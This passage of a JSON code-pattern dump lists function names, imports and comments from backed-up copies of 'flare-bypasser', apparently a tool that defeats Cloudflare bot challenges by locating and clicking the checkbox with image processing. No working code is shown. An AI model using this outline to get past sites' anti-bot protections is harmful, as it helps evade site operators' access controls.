          "# FLARE_BYPASS_COMMANDPROCESSORS format: <command>:<module>.<class>",
          "# class should have default constructor (without parameters)",
          "# Expect that extension element has format: <module>.<method>",
          "# Init ProxyController"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 2,
        "error_handling": 22,
        "decorators": [
          "@server.post(",
          "@server.post(",
          "@server.post(",
          "@server.post(",
          "@server.post("
        ]
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser/src/flare_bypasser/flare_bypasser.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, _dict=None):",
          "def __str__(self):",
          "def __init__(self, _dict):",
          "def __str__(self):",
          "def __init__(self, message: str, step: str = None):",
          "def __init__(",
          "def title_is_denied_title(page_title):",
          "def _get_dominant_color(image):",
          "def _get_flare_rect_contours(image, save_steps_dir: str = None):",
          "def get_flare_click_point(image, logger = None, save_steps_dir: str = None, log_prefix = ''):",
          "def _platform_for_error() -> str:"
        ],
        "class_defs": [
          "class Request(object):",
          "class Response:",
          "class BaseCommandProcessor(object):",
          "class GetCookiesCommandProcessor(BaseCommandProcessor):",
          "class GetPageCommandProcessor(BaseCommandProcessor):",
          "class PostCommandProcessor(BaseCommandProcessor):",
          "class Solver(object):",
          "class Exception(Exception):"
        ],
        "imports": [
          "import abc",
          "import sys",
          "import logging",
          "import os",
          "import typing",
          "import copy",
          "import random",
          "import datetime",
          "import asyncio",
          "import certifi",
          "import contextlib",
          "import html",
          "import urllib",
          "import numpy as np",
          "import cv2",
          "from .browser_wrapper import BrowserWrapper",
          "from .proxy_controller import ProxyController"
        ],
        "comments": [
          "# Image processing imports",
          "# Cloudflare",
          "# Cloudflare",
          "# Custom CloudFlare for EbookParadijs, Film-Paleis, MuziekFabriek and Puur-Hollands",
          "# Fairlane / pararius.com",
          "# preprocess url before solve (for example: can replace url with page content for POST request processing)",
          "# prepare page with form for emulate POST.",
          "# init standard commands",
          "# do some validations",
          "# Read outputs only after driver close (when process stopped),",
          "# otherwise output reading can be blocked.",
          "# Reask title (page loading can be finished between title getting and html checking)",
          "# find access denied titles",
          "# find access denied selectors",
          "# find challenge by title",
          "# find challenge by selectors",
          "# check that challenge present (wait when it will disappear after click)",
          "# check that need to click,",
          "# get screenshot of full page (all elements is in shadowroot)",
          "# clicking can be required few times.",
          "# recheck that challenge present - we can be already redirected and",
          "# need to exclude click on result page",
          "# < preprocess_command can say, that page opening isn't required (it opened it already).",
          "# navigate to the page",
          "# set cookies if required",
          "# find challenge by title",
          "# After solve, don't execute js ! Only extension can (it know page properties),",
          "# some pages can have problems with js evaluation (blocked js loop, ...)",
          "# Ask required page traits in parallel",
          "# We use separate driver instance for fill user-agent !",
          "# For fill user-agent we need to execute js,",
          "# requested page can have bad implementation and can blocks js execution (inf loop, ...)",
          "# Create instance without proxy",
          "# start_cpu_time = time.process_time()",
          "# Step, that can be runned once",
          "# Common steps",
          "# Dilate little omissions in contours (lost by color range or by image quality).",
          "# Dilate for increase contours detection precision.",
          "# end_cpu_time = time.process_time()",
          "# end_cpu_time = time.process_time()",
          "# ignore small rectangles",
          "# ignore very big rectangles",
          "# calculate area difference",
          "# eval iou with (with undestanding that contour_area inside rect_area)",
          "# get minimal contour (usualy we have here 3 contours",
          "# pack low distance contours (one rect can be present as 2 contours: inner, outer)",
          "# remove buggest contour",
          "# rect contours sorted by area ascending",
          "# Now we should find two rect contours (one inside other) with ratio 1-5%, (now I see: 0.0213).",
          "# Check area ratio and that area1 inside area2.",
          "# Checkbox found.",
          "# fix ssl certificates for compiled binaries",
          "# https://github.com/pyinstaller/pyinstaller/issues/7229",
          "# https://stackoverflow.com/questions/55736855/how-to-change-the-cafile-argument-in-the-ssl-module-in-python3"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 30,
        "decorators": [
          "@abc.abstractmethod",
          "@abc.abstractmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser/src/flare_bypasser/proxy_controller.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, proxy_storage: object, local_port: int, url: str):",
          "def add_ref(self):",
          "def remove_ref(self):",
          "def __init__(self, proxy_holder: object):",
          "def local_port(self):",
          "def url(self):",
          "def is_alive(self):",
          "def release(self):",
          "def __enter__(self):",
          "def __exit__(self, type, value, traceback):",
          "def __del__(self):",
          "def __init__(",
          "def get_proxy(self, url):",
          "def opened_proxies_count(self):",
          "def _port_is_listen(port):",
          "def _choose_port(self, url):",
          "def _start_proxy(self, proxy_holder):",
          "def _close_proxy(self, proxy_holder):"
        ],
        "class_defs": [
          "class ProxyController(object):",
          "class PortBusy(Exception):",
          "class NoPortForListen(Exception):",
          "class RunProxyCommandError(Exception):",
          "class ProxyHolder(object):",
          "class ProxyHolderRef(object):"
        ],
        "imports": [
          "import typing",
          "import threading",
          "import subprocess",
          "import socket",
          "import logging",
          "import contextlib",
          "import oslex",
          "import jinja2"
        ],
        "comments": [
          "# [start_port .. end_port]: localy started proxies will use ports in this interval",
          "# wait start if it in progress",
          "# < Start/wait start or simple increase ref.",
          "# Start proxy process",
          "# Close proxy process"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 7,
        "decorators": [
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser/examples/async_client/async_client_example.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import asyncio",
          "import argparse",
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser/examples/custom_user_commands/CustomUserCommands.py",
        "docstrings": [],
        "function_defs": [
          "def get_user_commands():"
        ],
        "class_defs": [
          "class MyClickCommandProcessor(BaseCommandProcessor):"
        ],
        "imports": [
          "import zendriver_flare_bypasser as zendriver",
          "from flare_bypasser import BaseCommandProcessor, Request, Response, BrowserWrapper"
        ],
        "comments": [
          "# Here we can check some required parameters in req.params and raise error.",
          "# Expect here \"Bledny kod\" text in DOM (appears only after click)"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser",
    "name": "flare-bypasser",
    "languages": [
      "Python"
    ],
    "python_patterns": [
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser/setup.py",
        "docstrings": [],
        "function_defs": [
          "def is_installed(pkgname):"
        ],
        "class_defs": [],
        "imports": [
          "import sys",
          "import os",
          "import importlib",
          "import distutils.core"
        ],
        "comments": [
          "# Trick for avoid installation of non pip installed packages (apt), available by ADDITIONAL_PYTHONPATH",
          "# 'websockets @ git+https://github.com/yoori/websockets.git@main',",
          "# 'zendriver_flare_bypasser==0.2.7',",
          "# 'zendriver_flare_bypasser @ git+https://github.com/yoori/zendriver.git@debug4',",
          "# 'zendriver_flare_bypasser @ git+https://github.com/yoori/zendriver.git@flare-bypasser-test',",
          "# Server dependecies"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser/utils/checkbox_recognizer.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import sys",
          "import logging",
          "import argparse",
          "import cv2",
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser/utils/linux_chrome_archive_installer.py",
        "docstrings": [],
        "function_defs": [
          "def fetch_package(download_url):",
          "def unzip_package(",
          "def download_and_install(version_prefix = None, install_root = None, arch = 'x86_64'):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import shutil",
          "import logging",
          "import json",
          "import zipfile",
          "import argparse",
          "from urllib.request import urlretrieve, urlopen"
        ],
        "comments": [
          "# Script can install chrome only on linux platforms and only on x86_64.",
          "# here no archive of versions for linux/arm64",
          "# If version is undefined: use max_version"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 6,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser/utils/drission_page_solver/drission_page_solver.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, driver: ChromiumPage, max_retries=-1, log=True):",
          "def search_recursively_shadow_root_with_iframe(self, ele):",
          "def search_recursively_shadow_root_with_cf_input(self, ele):",
          "def locate_cf_button(self):",
          "def log_message(self, message):",
          "def click_verification_button(self):",
          "def is_bypassed(self):",
          "def bypass(self):",
          "def bypass_cloudflare(url: str, retries: int, log: bool, proxy: str = None) -> ChromiumPage:",
          "def main():"
        ],
        "class_defs": [
          "class CloudflareBypasser:"
        ],
        "imports": [
          "import sys",
          "import logging",
          "import time",
          "import numpy as np",
          "import argparse",
          "import cv2",
          "from pyvirtualdisplay import Display",
          "from DrissionPage import ChromiumPage, ChromiumOptions, WebPage"
        ],
        "comments": [
          "# If the button is not found, search it recursively",
          "# Start Xvfb for Docker"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 7,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser/tests/unit_tests/proxy_controller_test.py",
        "docstrings": [],
        "function_defs": [
          "def test_two_different_proxies_rent():",
          "def test_two_equal_proxies_rent():"
        ],
        "class_defs": [],
        "imports": [
          "from flare_bypasser import ProxyController"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser/src/flare_bypasser/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import importlib.metadata",
          "from .flare_bypasser import Request, Response, Solver, BrowserWrapper, BaseCommandProcessor",
          "from .proxy_controller import ProxyController",
          "from .flare_bypass_server import server, server_run",
          "from .async_client import AsyncClient"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser/src/flare_bypasser/async_client.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, solver_url, *args, **kwargs):",
          "def http_client(self) -> httpx.AsyncClient:",
          "def _init_client(self):"
        ],
        "class_defs": [
          "class AsyncClient(object):",
          "class Exception(Exception):",
          "class CloudFlareBlocked(Exception):"
        ],
        "imports": [
          "import typing",
          "import copy",
          "import json",
          "import re",
          "import httpx"
        ],
        "comments": [
          "# < base user-agent that will be used before first challenge solve,",
          "# after it will be replaced with solver actual user-agent",
          "# request web page",
          "# check that it is cloud flare unsolvable block",
          "# check that it is cloud flare block",
          "# c is http.cookiejar.Cookie",
          "# < use for solve original client cookies,",
          "# it can contains some required information other that cloud flare marker.",
          "# Update _http_client cookies"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": [
          "@property"
        ]
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser/src/flare_bypasser/browser_wrapper.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, center):",
          "def __init__(self, page: zendriver.Tab, center_coords):",
          "def _make_attrs(self):  # override for exclude exception on __init__",
          "def __init__(",
          "def __del__(self):",
          "def start_xvfb_display():",
          "def get_driver(self) -> zendriver.Tab:",
          "def _parse_call(task):"
        ],
        "class_defs": [
          "class BrowserWrapper(object):",
          "class FakePosition(object):",
          "class FakeNode(object):",
          "class FakeElement(zendriver.Element):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import typing",
          "import asyncio",
          "import uuid",
          "import shutil",
          "import logging",
          "import time",
          "import cv2",
          "import zendriver_flare_bypasser as zendriver",
          "from xvfbwrapper import Xvfb"
        ],
        "comments": [
          "# < zendriver expect here only json serializable types",
          "# Attributes for working __repr__:",
          "# overrides for call only cdp click send in zendriver.Element.mouse_click",
          "# \"--disable-software-rasterizer\",",
          "# Disable certificates checking",
          "# browser_args += [\"--ignore-certificate-errors\", \"--ignore-urlfetcher-cert-requests\"]",
          "# Get original driver page impl - can be used only in user command specific implementations",
          "# return (title, loaded flag)",
          "# DOM tree changed in runtime",
          "# Ignore \"DOM agent isn't enabled\" on DOM.disable",
          "# < zendriver timeout on element waiting",
          "# external timeout: page isn't loaded",
          "# < Select without waiting.",
          "# DOM tree changed in runtime",
          "# Ignore \"DOM agent isn't enabled\" on DOM.disable",
          "# we work only with one page - close all tabs (excluding first - this close browser)",
          "# Specific workaround for zendriver",
          "# click by coordinates without no driver patching.",
          "# convert {\"name\": \"...\", \"value\": \"...\", ...} to array of http.cookiejar.Cookie",
          "# < self._zendriver_driver.cookies.set_all(set_cookies)",
          "# return list of dict have format: {\"name\": \"...\", \"value\": \"...\"}",
          "# < self._zendriver_driver.cookies.get_all(requests_cookie_format=True)",
          "# convert array of http.cookiejar.Cookie to expected cookie format",
          "# Wrap call that allow to repeat driver call after timeout_step",
          "# Used as workaround for case when chrome don't response on CDP request",
          "# Can be disabled by enable_lost_cdp_workaround flag",
          "# for understand why we pass lambda to _deffered_call, see _deffered_call description",
          "# handle exceptions like: TypeError: target must be set to a 'TargetInfo' but got 'NoneType",
          "# it can appears in zendriver.connection.update_target on all operations,",
          "# (as result of runtime DOM changes or on page loading)",
          "# task is function, that will return coro, this allow to",
          "# avoid \"coroutine ... was never awaited\" warning",
          "# (we create coro only before it await)",
          "# wait first task canceled for get stack in exception"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 25,
        "decorators": [
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser/src/flare_bypasser/example_command_processor.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class ExampleCommandProcessor(flare_bypasser.BaseCommandProcessor):"
        ],
        "imports": [
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser/src/flare_bypasser/flare_bypass_server.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, app):",
          "def parse_class_command_processors(custom_command_processors_str: str):",
          "def parse_entrypoint_command_processors(extension: str):",
          "def parse_solve_forks(solve_forks: str):",
          "def init_args_parser():",
          "def init_extensions(args):",
          "def server_run():"
        ],
        "class_defs": [
          "class RemoveContentTypeRequirementMiddleware(object):",
          "class ProxyModel(pydantic.BaseModel):",
          "class CookieModel(pydantic.BaseModel):",
          "class DefferedForksModel(pydantic.BaseModel):",
          "class HandleCommandResponseSolution(pydantic.BaseModel):",
          "class HandleCommandResponse(pydantic.BaseModel):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import re",
          "import typing",
          "import typing_extensions",
          "import datetime",
          "import copy",
          "import platform",
          "import uuid",
          "import pathlib",
          "import asyncio",
          "import traceback",
          "import importlib",
          "import logging",
          "import argparse",
          "import urllib3.util",
          "import fastapi",
          "import pydantic",
          "import flare_bypasser",
          "import gunicorn.app.wsgiapp",
          "import uvicorn.main"
        ],
        "comments": [
          "# Remove requirement for Content-Type header presence.",
          "# Unexpected headers format - don't make something.",
          "# Adapt proxy format for canonical representation.",
          "# < solve_response can't be None if no return_condition passed to wait_first_non_exception,",
          "# only exception expected",
          "# < pass cookies as dict's (solver don't know about rest model).",
          "# Endpoint compatible with flaresolverr API.",
          "# REST API concept methods.",
          "# postDataContentType: typing_extensions.Annotated[",
          "#   str,",
          "#   fastapi.Body(description=\"Content-Type that will be sent.\")",
          "#   ]='',",
          "# 'postDataContentType': postDataContentType,",
          "# < parse for pass to gunicorn as is and as \"--host X --port X\" to uvicorn",
          "# FLARE_BYPASS_COMMANDPROCESSORS format: <command>:<module>.<class>",
          "# class should have default constructor (without parameters)",
          "# Expect that extension element has format: <module>.<method>",
          "# Init ProxyController"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 2,
        "error_handling": 22,
        "decorators": [
          "@server.post(",
          "@server.post(",
          "@server.post(",
          "@server.post(",
          "@server.post("
        ]
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser/src/flare_bypasser/flare_bypasser.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, _dict=None):",
          "def __str__(self):",
          "def __init__(self, _dict):",
          "def __str__(self):",
          "def __init__(self, message: str, step: str = None):",
          "def __init__(",
          "def title_is_denied_title(page_title):",
          "def _get_dominant_color(image):",
          "def _get_flare_rect_contours(image, save_steps_dir: str = None):",
          "def get_flare_click_point(image, logger = None, save_steps_dir: str = None, log_prefix = ''):",
          "def _platform_for_error() -> str:"
        ],
        "class_defs": [
          "class Request(object):",
          "class Response:",
          "class BaseCommandProcessor(object):",
          "class GetCookiesCommandProcessor(BaseCommandProcessor):",
          "class GetPageCommandProcessor(BaseCommandProcessor):",
          "class PostCommandProcessor(BaseCommandProcessor):",
          "class Solver(object):",
          "class Exception(Exception):"
        ],
        "imports": [
          "import abc",
          "import sys",
          "import logging",
          "import os",
          "import typing",
          "import copy",
          "import random",
          "import datetime",
          "import asyncio",
          "import certifi",
          "import contextlib",
          "import html",
          "import urllib",
          "import numpy as np",
          "import cv2",
          "from .browser_wrapper import BrowserWrapper",
          "from .proxy_controller import ProxyController"
        ],
        "comments": [
          "# Image processing imports",
          "# Cloudflare",
          "# Cloudflare",
          "# Custom CloudFlare for EbookParadijs, Film-Paleis, MuziekFabriek and Puur-Hollands",
          "# Fairlane / pararius.com",
          "# preprocess url before solve (for example: can replace url with page content for POST request processing)",
          "# prepare page with form for emulate POST.",
          "# init standard commands",
          "# do some validations",
          "# Read outputs only after driver close (when process stopped),",
          "# otherwise output reading can be blocked.",
          "# Reask title (page loading can be finished between title getting and html checking)",
          "# find access denied titles",
          "# find access denied selectors",
          "# find challenge by title",
          "# find challenge by selectors",
          "# check that challenge present (wait when it will disappear after click)",
          "# check that need to click,",
          "# get screenshot of full page (all elements is in shadowroot)",
          "# clicking can be required few times.",
          "# recheck that challenge present - we can be already redirected and",
          "# need to exclude click on result page",
          "# < preprocess_command can say, that page opening isn't required (it opened it already).",
          "# navigate to the page",
          "# set cookies if required",
          "# find challenge by title",
          "# After solve, don't execute js ! Only extension can (it know page properties),",
          "# some pages can have problems with js evaluation (blocked js loop, ...)",
          "# Ask required page traits in parallel",
          "# We use separate driver instance for fill user-agent !",
          "# For fill user-agent we need to execute js,",
          "# requested page can have bad implementation and can blocks js execution (inf loop, ...)",
          "# Create instance without proxy",
          "# start_cpu_time = time.process_time()",
          "# Step, that can be runned once",
          "# Common steps",
          "# Dilate little omissions in contours (lost by color range or by image quality).",
          "# Dilate for increase contours detection precision.",
          "# end_cpu_time = time.process_time()",
          "# end_cpu_time = time.process_time()",
          "# ignore small rectangles",
          "# ignore very big rectangles",
          "# calculate area difference",
          "# eval iou with (with undestanding that contour_area inside rect_area)",
          "# get minimal contour (usualy we have here 3 contours",
          "# pack low distance contours (one rect can be present as 2 contours: inner, outer)",
          "# remove buggest contour",
          "# rect contours sorted by area ascending",
          "# Now we should find two rect contours (one inside other) with ratio 1-5%, (now I see: 0.0213).",
          "# Check area ratio and that area1 inside area2.",
          "# Checkbox found.",
          "# fix ssl certificates for compiled binaries",
          "# https://github.com/pyinstaller/pyinstaller/issues/7229",
          "# https://stackoverflow.com/questions/55736855/how-to-change-the-cafile-argument-in-the-ssl-module-in-python3"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 30,
        "decorators": [
          "@abc.abstractmethod",
          "@abc.abstractmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser/src/flare_bypasser/proxy_controller.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, proxy_storage: object, local_port: int, url: str):",
          "def add_ref(self):",
          "def remove_ref(self):",
          "def __init__(self, proxy_holder: object):",
          "def local_port(self):",
          "def url(self):",
          "def is_alive(self):",
          "def release(self):",
          "def __enter__(self):",
          "def __exit__(self, type, value, traceback):",
          "def __del__(self):",
          "def __init__(",
          "def get_proxy(self, url):",
          "def opened_proxies_count(self):",
          "def _port_is_listen(port):",
          "def _choose_port(self, url):",
          "def _start_proxy(self, proxy_holder):",
          "def _close_proxy(self, proxy_holder):"
        ],
        "class_defs": [
          "class ProxyController(object):",
          "class PortBusy(Exception):",
          "class NoPortForListen(Exception):",
          "class RunProxyCommandError(Exception):",
          "class ProxyHolder(object):",
          "class ProxyHolderRef(object):"
        ],
        "imports": [
          "import typing",
          "import threading",
          "import subprocess",
          "import socket",
          "import logging",
          "import contextlib",
          "import oslex",
          "import jinja2"
        ],
        "comments": [
          "# [start_port .. end_port]: localy started proxies will use ports in this interval",
          "# wait start if it in progress",
          "# < Start/wait start or simple increase ref.",
          "# Start proxy process",
          "# Close proxy process"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 7,
        "decorators": [
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser/examples/async_client/async_client_example.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import asyncio",
          "import argparse",
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser/examples/custom_user_commands/CustomUserCommands.py",
        "docstrings": [],
        "function_defs": [
          "def get_user_commands():"
        ],
        "class_defs": [
          "class MyClickCommandProcessor(BaseCommandProcessor):"
        ],
        "imports": [
          "import zendriver_flare_bypasser as zendriver",
          "from flare_bypasser import BaseCommandProcessor, Request, Response, BrowserWrapper"
        ],
        "comments": [
          "# Here we can check some required parameters in req.params and raise error.",
          "# Expect here \"Bledny kod\" text in DOM (appears only after click)"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser-arm",
    "name": "flare-bypasser-arm",
    "languages": [
      "Python"
    ],
    "python_patterns": [
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser-arm/setup.py",
        "docstrings": [],
        "function_defs": [
          "def is_installed(pkgname):"
        ],
        "class_defs": [],
        "imports": [
          "import sys",
          "import os",
          "import importlib",
          "import distutils.core"
        ],
        "comments": [
          "# Trick for avoid installation of non pip installed packages (apt), available by ADDITIONAL_PYTHONPATH",
          "# 'websockets @ git+https://github.com/yoori/websockets.git@main',",
          "# 'zendriver_flare_bypasser @ git+https://github.com/yoori/zendriver.git@stable3',",
          "# 'zendriver_flare_bypasser @ git+https://github.com/yoori/zendriver.git@flare-bypasser',",
          "# Server dependecies"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser-arm/utils/checkbox_recognizer.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import sys",
          "import logging",
          "import argparse",
          "import cv2",
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser-arm/utils/linux_chrome_archive_installer.py",
        "docstrings": [],
        "function_defs": [
          "def fetch_package(download_url):",
          "def unzip_package(",
          "def download_and_install(version_prefix = None, install_root = None, arch = 'x86_64'):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import shutil",
          "import logging",
          "import json",
          "import zipfile",
          "import argparse",
          "from urllib.request import urlretrieve, urlopen"
        ],
        "comments": [
          "# Script can install chrome only on linux platforms and only on x86_64.",
          "# here no archive of versions for linux/arm64",
          "# If version is undefined: use max_version"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 6,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser-arm/tests/unit_tests/proxy_controller_test.py",
        "docstrings": [],
        "function_defs": [
          "def test_two_different_proxies_rent():",
          "def test_two_equal_proxies_rent():"
        ],
        "class_defs": [],
        "imports": [
          "from flare_bypasser import ProxyController"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser-arm/src/flare_bypasser/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import importlib.metadata",
          "from .flare_bypasser import Request, Response, Solver, BrowserWrapper, BaseCommandProcessor",
          "from .proxy_controller import ProxyController",
          "from .flare_bypass_server import server, server_run",
          "from .async_client import AsyncClient"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser-arm/src/flare_bypasser/async_client.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, solver_url):",
          "def http_client(self) -> httpx.AsyncClient:"
        ],
        "class_defs": [
          "class AsyncClient(object):",
          "class Exception(Exception):"
        ],
        "imports": [
          "import typing",
          "import copy",
          "import json",
          "import re",
          "import httpx"
        ],
        "comments": [
          "# < base user-agent that will be used before first challenge solve,",
          "# after it will be replaced with solver actual user-agent",
          "# request web page",
          "# check that it is cloud flare block",
          "# Return site original 403(non cloud flare blocking) as is - application should process it.",
          "# c is http.cookiejar.Cookie",
          "# < use for solve original client cookies,",
          "# it can contains some required information other that cloud flare marker.",
          "# Update _http_client cookies"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 3,
        "decorators": [
          "@property"
        ]
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser-arm/src/flare_bypasser/browser_wrapper.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, center):",
          "def __init__(self, page: zendriver.Tab, center_coords):",
          "def _make_attrs(self):  # override for exclude exception on __init__",
          "def __init__(",
          "def __del__(self):",
          "def start_xvfb_display():",
          "def get_driver(self) -> zendriver.Tab:",
          "def _parse_call(task):"
        ],
        "class_defs": [
          "class BrowserWrapper(object):",
          "class FakePosition(object):",
          "class FakeNode(object):",
          "class FakeElement(zendriver.Element):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import typing",
          "import asyncio",
          "import uuid",
          "import shutil",
          "import logging",
          "import time",
          "import cv2",
          "import zendriver_flare_bypasser as zendriver",
          "from xvfbwrapper import Xvfb"
        ],
        "comments": [
          "# < zendriver expect here only json serializable types",
          "# Attributes for working __repr__:",
          "# overrides for call only cdp click send in zendriver.Element.mouse_click",
          "# Disable certificates checking",
          "# Get original driver page impl - can be used only in user command specific implementations",
          "# return (title, loaded flag)",
          "# DOM tree changed in runtime",
          "# < zendriver timeout on element waiting",
          "# external timeout: page isn't loaded",
          "# < Select without waiting.",
          "# DOM tree changed in runtime",
          "# we work only with one page - close all tabs (excluding first - this close browser)",
          "# Specific workaround for zendriver",
          "# click by coordinates without no driver patching.",
          "# convert {\"name\": \"...\", \"value\": \"...\", ...} to array of http.cookiejar.Cookie",
          "# < self._zendriver_driver.cookies.set_all(set_cookies)",
          "# return list of dict have format: {\"name\": \"...\", \"value\": \"...\"}",
          "# < self._zendriver_driver.cookies.get_all(requests_cookie_format=True)",
          "# convert array of http.cookiejar.Cookie to expected cookie format",
          "# Wrap call that allow to repeat driver call after timeout_step",
          "# Used as workaround for case when chrome don't response on CDP request",
          "# Can be disabled by enable_lost_cdp_workaround flag",
          "# for understand why we pass lambda to _deffered_call, see _deffered_call description",
          "# handle exceptions like: TypeError: target must be set to a 'TargetInfo' but got 'NoneType",
          "# it can appears in zendriver.connection.update_target on all operations,",
          "# (as result of runtime DOM changes or on page loading)",
          "# task is function, that will return coro, this allow to",
          "# avoid \"coroutine ... was never awaited\" warning",
          "# (we create coro only before it await)",
          "# wait first task canceled for get stack in exception"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 22,
        "decorators": [
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser-arm/src/flare_bypasser/example_command_processor.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
